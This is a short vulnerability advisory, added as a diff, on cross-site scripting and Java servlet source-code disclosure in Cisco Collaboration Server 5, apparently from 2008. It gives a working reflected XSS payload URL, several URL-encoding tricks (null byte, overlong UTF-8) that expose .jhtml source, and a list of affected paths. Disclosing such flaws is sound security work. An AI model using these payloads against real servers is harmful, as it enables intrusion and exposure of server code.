@@ -1,0 +1,85 @@
+Cisco Collaboration Server 5 XSS, Source Code Disclosure
+
+Discovered by:  s4squatch of SecureState R&D Team (www.securestate.com)
+
+Discovered: 08/26/2008
+
+ 
+
+Note: End of Engineering  -->  http://www.cisco.com/en/US/products/sw/custcosw/ps747/prod_eol_notice09186a008032d4d0.html
+
+Replaced with: http://www.cisco.com/en/US/products/ps7233/index.html and http://www.cisco.com/en/US/products/ps7236/index.html
+
+ 
+
+ 
+
+XSS
+
+===
+
+http://www.website.com/webline/html/admin/wcs/LoginPage.jhtml?oper=&dest="><script>alert('xss!')</script>
+
+ 
+
+Java Servlet Source Code Disclosure
+
+===================================
+
+The source code of .jhtml files is revealed to the end user by requesting any of the following:
+
+ 
+
+Normal File:                        file.html
+
+ 
+
+Modified 1:                                         file%2Ejhtml
+
+Modified 2:                                         file.jhtm%6C
+
+Modified 3:                                         file.jhtml%00
+
+Modified 4:                                         file.jhtml%c0%80
+
+ 
+
+Cisco Collaboration Server 5 Paths It Works On (list may not be complete)
+
+=========================================================================                                                                                                            
+
+http://www.website.com/doc/docindex.jhtml                                                                                                                                                                                                
+
+http://www.website.com/browserId/wizardForm.jhtml
+
+http://www.website.com/webline/html/forms/callback.jhtml
+
+http://www.website.com/webline/html/forms/callbackICM.jhtml
+
+http://www.website.com/webline/html/agent/AgentFrame.jhtml
+
+http://www.website.com/webline/html/agent/default/badlogin.jhtml
+
+http://www.website.com/callme/callForm.jhtml
+
+http://www.website.com/webline/html/multichatui/nowDefunctWindow.jhtml
+
+http://www.website.com/browserId/wizard.jhtml
+
+http://www.website.com/admin/CiscoAdmin.jhtml
+
+http://www.website.com/msccallme/mscCallForm.jhtml
+
+http://www.website.com/webline/html/admin/wcs/LoginPage.jhtml
+
+ 
+
+Related Public Info
+
+===================
+
+http://www.securityfocus.com/bid/3592/info
+
+http://www.securityfocus.com/bid/1578/info
+
+http://www.securityfocus.com/bid/1328/info
